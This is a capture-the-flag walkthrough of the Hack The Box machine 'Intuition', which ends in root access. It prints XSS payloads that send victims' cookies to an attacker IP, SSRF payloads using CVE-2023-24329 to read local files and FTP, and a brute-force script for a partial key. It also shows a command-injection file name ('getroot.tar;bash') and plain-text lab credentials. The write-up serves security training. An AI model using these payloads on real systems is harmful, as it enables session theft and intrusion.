---
title: HTB-Intuition
draft: false
tags:
  - htb
  - linux
  - hard
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/Intuition.png)

## Information Gathering
### Rustscan

Rustscan finds port 22 and 80 open:

`rustscan --addresses 10.10.11.15 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-16.png)

## Enumeration
### HTTP - TCP 80

Let's first add **comprezzor.htb** to  `/etc/hosts`.

Accessing **comprezzor.htb** shows a website where we can upload txt, pdf, docx and compress using LZMA Algorithm:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image.png)

Let's see if there are more hidden subdomains:

`sudo gobuster vhost --append-domain -u http://comprezzor.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-1.png)

Gobuster finds several more subdomains:

- auth.comprezzor.htb
- report.comprezzor.htb
- dashboard.comprezzor.htb

Let's add all above again to `/etc/hosts`.

**auth.comprezzor.htb** is a login portal:

`http://auth.comprezzor.htb/login`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-2.png)

Below the portal, there's a Register link. 

It seems like registration actually works:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-4.png)

Using the registration credentials, let's sign-in:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-5.png)

Now that we are signed-in, we will first take a look at the cookies.

Go to **Storage** -> **Cookies** and we can access the cookie value:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-3.png)

Let's decode the vaule obtained with base64:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-7.png)

Web app is storing cookie in the format of **user_id**, **username**, **role**, and some kind of **hash** in the end. 

We have tried cracking this hash but it wasn't successful. 

Let's try changing the **role** from **user** to **admin** and see what happens.

We will **base64** encode the modified following data:

`{"user_id": 6, "username": "jadu", "role": "admin"}|8e8f57556ef8398f42dcbb05bc78b3f8f184f0ff7b0dde60aace0b97cd7216f2`                                        
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-8.png)

We expected to bypass the login portal after replacing the cookie value with the base64 hash above. 

Unfortunately, nothing happened. Let's restore cookie value to mitigate issue.                                                     
## XSS Cookie Stealing 
### Adam Cookie

Now let's move on to enumerating **report.comprezzor.htb**. 

`/report_bug` will lead us to report submission form:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-6.png)

From some research, we have discovered that this form is vulnerable to XSS Cookie Stealing. 

Let's use the following payload on both fields of the form with out Python server listening:

```html
<img src=x onerror="fetch('http://10.10.14.29:8000/?cookie='+document.cookie)">
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-9.png)

After successful execution, we can observe cookie being stolen on our Python server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-10.png)

Similarly, we can use the following payload as well to obtain the same result:

```html
<script>var i=new Image(); i.src="http://10.10.14.29:8000/?cookie="+btoa(document.cookie);</script>
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-11.png)

We get cookie value on our Python listener:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-12.png)

However, cookie value obtained from the first payload and the second payload looks different. This is because seocond payload output cookie is base64 encoded.

If we base64 decode it, it looks the exactly same as the first payload output coookie:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-13.png)

Base64 decoding on the **user_data**, we can see that this is the cookie value for user **adam** and he has the role as the **Webdev**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-14.png)

Replacing **user_data** cookie value with the obtained cookie for **adam**, we can bypass login portal and access **dashboard.comprezzor.htb**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-15.png)


### Admin Cookie

Let's see what functionality does dashboard provides.

Clicking on report ID, we are provided with the features of setting the Report to be **Resolved**, **Set High Priority**, or **Delete Report**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-17.png)

Our guess is that if we set the report with the Cookie stealing payload as high priority, admin user will read it and will return his/her cookie value back to us. 

Let's go back to Report Submission form and create the same payload that will steal cookie value:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-20.png)

After submitting, we can verify it on dashboard.

However, priorty is set as **0**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-19.png)

Using Burp Suite, let's the value for priority to be **1**, so that the admin user will take a look at it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-18.png)

Now we can see that the priority has changed to **1**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-23.png)

Within no time, we retrieve admin user's cookie:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-24.png)

First cookie retrieval is from user **adam** and the second cookie retrieval should be from the **admin user**.

We retrieve cookie value from both adam and admin user because there is a slight time delay while we set the priority to be **1** after payload submission. 

base64 deocding it, we successfully obtain the coookie value for **admin**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-21.png)


## SSRF 

Let's sign-in to dashboard using admin's cookie value. 

We can observe that some more features are provided for admin:

- Full report list
- Create a backup
- Create PDF Report

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-22.png)

Checking on **Create PDF Report**, we can see that we input URL and the web app will generate a PDF Report out of it:

`/create_pdf_report`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-25.png)

Submitting URL to a web form, immediately reminded me of **SSRF**.

Let's spin up a Python web server on our local machine:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-26.png)

Now let's input the address of our Python web server on the web form:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-27.png)

We can see that the PDF is created and it shows the directory listing for the Python web server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-28.png)

Taking a look at the PDF Creator using **exiftool**, it is identify to be **wkhtmltopdf 0.12.6**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-29.png)

There is known **SSRF** vulnerability regarding wkhtmltopdf 0.12.6, but it turned out to be a dead end. 
### CVE-2023–24329

Instead of checking on the PDF creator, let's see what software is being used when it is sending out the PDF back to us.

After spinning up netcat listener on our Kali machine and we will generate PDF of our netcat listener:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-30.png)

We get different output compared to Python web server. 

**User-Agent** is identified and it is **Python-urllib/3.11**. 

Searching for the known vulnerabilities regarding it, **CVE-2023-24329** is found:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-31.png)

We would be able to bypass blocking listing methods via using blank characters in the front:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-32.png)

Let's see if it actually works:

` file:///etc/passwd`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-33.png)

Generated PDF contains `/etc/passwd` file, verifying the vulnerability:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-34.png)

Lets request on **cmdline** to know the current running process.

The `/proc/self/cmdline` file in Linux contains the command line arguments passed to the currently running process. It provides insight into how a process was invoked, including any flags, options, or parameters supplied to it:

` file:///proc/self/cmdline`

The currently running application is `/app/code/app.py`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-35.png)

Let's retrieve its code:

` file:////app/code/app.py`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-36.png)

Using ChatGPT, we can make the output more readable:

```python
from flask import Flask, request, redirect
from blueprints.index.index import main_bp
from blueprints.report.report import report_bp
from blueprints.auth.auth import auth_bp
from blueprints.dashboard.dashboard import dashboard_bp

app = Flask(__name__)
app.secret_key = "7ASS7ADA8RF3FD7"
app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # Limit file size to 5MB

ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'}  # Add more allowed file extensions if needed

app.register_blueprint(main_bp)
app.register_blueprint(report_bp, subdomain='report')
app.register_blueprint(auth_bp, subdomain='auth')
app.register_blueprint(dashboard_bp, subdomain='dashboard')

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=80)
```

Above code sets up a Flask web application with multiple blueprints and specific configurations. 

Based on **app.py**, let's take a look at **dashboard.py**:

` file:///app/code/blueprints/dashboard/dashboard.py`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-37.png)

On **dashboard.py**, credentials for FTP login is revealed:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-38.png)

## Shell as dev_acc

Using the FTP credentials, we can login via SSRF.

Let's type in the following command on PDF Generation URL:

` ftp://ftp_admin:u3jai8y71s2@ftp.local/`

Output PDF shows the directory listing of FTP:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-39.png)

Let's take a look at **welcome_note.txt** file:

` ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt`

**welcome_note.txt** file contains the passphrase for SSH: *Y27SH19HDIWD*

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-40.png)

Let's take a look at **private-8297.key**:

` ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key`

Key files is a OpenSSH Private Key:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-41.png)

Let's use **ssh-keygen** to output the public key associated with the private key, which might include any comments that were created when the key pair was generated:

`ssh-keygen -y -f  id_rsa`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-42.png)

User name **dev_acc** was left as a comment on SSH private key.

Now using the discovered passphrase and SSH Private Key, we can SSH-in to the system as **dev_acc**:

`ssh -i id_rsa dev_acc@comprezzor.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-43.png)


## Privesc: dev_acc to lopez
### Linpeas

We will first run linpeas to see if there's anything interesting.

There are several ports open internally. We might port forward on these ports later on.

One interesting open port is **21**, meaning FTP is open internally.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-44.png)

We can also see what users are on the system:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-45.png)

Several interesting files were found, including **users.db** and **users.sql**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-46.png)

**sqlite** database folder is also found:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-47.png)

### Local Enumeration

Now let's go ahead and further enumerate on what linpeas discovered. 

There are two web apps running on this machine: **blueprints** and **selenium**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-48.png)

Let's first check on **users.db** that linpeas found.

We can dump the database using **sqlite3**

`sqlite3 users.db`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-49.png)

We have hashes for **admin** and **adam**.

Only **adam**'s hash could be cracked and the password is: **adam gray**

### FTP as adam

Since we know that FTP is open internally, let's login to it as **adam**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-50.png)

There lies **run-tests.sh**, **runner1**, and **runner1.c** files inside `/backup/runner1`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-51.png)

Let's download all three to `/tmp` directory:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-52.png)

**run-tests.sh** seems to be requiring a key in order to be ran but the last four digits are missing:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-53.png)


**runner1.c** seems to be making authentication by comparing the key to the stored md5 hash before granting to run the application:

```c
// Version : 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/md5.h>

#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"

int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);

    char md5_str[33];
    for (int i = 0; i < 16; i++) {
        sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}

void listPlaybooks() {
    DIR *dir = opendir(PLAYBOOK_LOCATION);
    if (dir == NULL) {
        perror("Failed to open the playbook directory");
        return;
    }

    struct dirent *entry;
    int playbookNumber = 1;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
            printf("%d: %s\n", playbookNumber, entry->d_name);
            playbookNumber++;
        }
    }

    closedir(dir);
}

void runPlaybook(const char *playbookName) {
    char run_command[1024];
    snprintf(run_command, sizeof(run_command), "%s -i %s %s%s", ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
    system(run_command);
}

void installRole(const char *roleURL) {
    char install_command[1024];
    snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleURL);
    system(install_command);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    int auth_required = 0;
    char auth_key[128];

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0) {
            if (i + 1 < argc) {
                strncpy(auth_key, argv[i + 1], sizeof(auth_key));
                auth_required = 1;
                break;
            } else {
                printf("Error: -a option requires an auth key.\n");
                return 1;
            }
        }
    }

    if (!check_auth(auth_key)) {
        printf("Error: Authentication failed.\n");
        return 1;
    }

    if (strcmp(argv[1], "list") == 0) {
        listPlaybooks();
    } else if (strcmp(argv[1], "run") == 0) {
        int playbookNumber = atoi(argv[2]);
        if (playbookNumber > 0) {
            DIR *dir = opendir(PLAYBOOK_LOCATION);
            if (dir == NULL) {
                perror("Failed to open the playbook directory");
                return 1;
            }

            struct dirent *entry;
            int currentPlaybookNumber = 1;
            char *playbookName = NULL;

            while ((entry = readdir(dir)) != NULL) {
                if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
                    if (currentPlaybookNumber == playbookNumber) {
                        playbookName = entry->d_name;
                        break;
                    }
                    currentPlaybookNumber++;
                }
            }

            closedir(dir);

            if (playbookName != NULL) {
                runPlaybook(playbookName);
            } else {
                printf("Invalid playbook number.\n");
            }
        } else {
            printf("Invalid playbook number.\n");
        }
    } else if (strcmp(argv[1], "install") == 0) {
        installRole(argv[2]);
    } else {
        printf("Usage2: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    return 0;
}
```


### Key Guessing

Let's move on to guessing the last four digits of the key.

Here’s the missing value key: `UHI75GHI****`. The hash associated with it is `0feda17076d793c2ef2870d7427ad4ed`.

We can use the Python code below to try all possible combinations:

```python
import time
import itertools
import hashlib
import string

start_time = time.time()

# Define the hash and characters to be brute forced 
target_hash = "0feda17076d793c2ef2870d7427ad4ed"
access_code = "UHI75GHI"
character_set = string.ascii_letters + string.digits
key_length = 4

# Function to check if the generated hash matches the target or not
def compare_hash(candidate_key_hash, target_key_hash):
    generated_hash = hashlib.md5(candidate_key_hash.encode()).hexdigest()
    return generated_hash == target_key_hash

# Loop through combinations to find the matching key
for key_guess in itertools.product(character_set, repeat=key_length):
    potential_key = f"{access_code}{''.join(key_guess)}"
    if compare_hash(potential_key, target_hash):
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(potential_key)
        print(f"Time consumed: {elapsed_time} seconds")
        break  
else:
    end_time = time.time()
    elapsed_time = end_time - start_time
    print("No matching key found.")
    print(f"Time consumed: {elapsed_time} seconds")
```

Python script guesses the key within 7 seconds: *UHI75GHINKOP*

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-54.png)

### Suricata

Unfortunately, we do not have the privilege to run **runner1** although we have the correct key:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-55.png)

After spending lot of time on enumeration, we found something interesting on `/opt`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-56.png)

There is a directory called `runner2` but only `sys_adm` group can access it, The idea is, this is the version 2 of the application we was exploiting before `runner1` so it should be related somehow, after some search again I found logs directory for **suricata**.

There are multiple zip files inside `/var/log/suricata`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-57.png)


**Suricata** sometimes leave credentials behind so let's look for the active usernames with **zgrep**.

Searching for user **lopez**, we can see authentication password for user lopez: **Lopezz1992%123**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-60.png)

Now we can switch in to **lopez**'s shell using `su lopez` and the discovered password:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-59.png)

## Privesc: lopez to root

`lopez` user is one of the `sys-adm` group so we can access the `runner2` directory now:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-58.png)

It seems that **runner2** application receive json file as the input:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-61.png)

After long enumeration, we discovered way to exploit this. 

We will frist create a json file with the key on it as such:

`echo ' { "auth_code": "UHI75GHINKOP", "run": { "action": "install", "role_file": "getroot.tar;bash" } }' > file.json`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-62.png)

Let's create **archive.tar.gz** file:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-63.png)

Now, let's change the name of the zip file into **getroot.tar;bash**:

`mv archive.tar.gz "getroot.tar;bash"`

When we run **runner2** towards **file.json**, we get a shell as the root:

`sudo /opt/runner2/runner2 file.json`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/intuition/image-64.png)

## References
- https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e
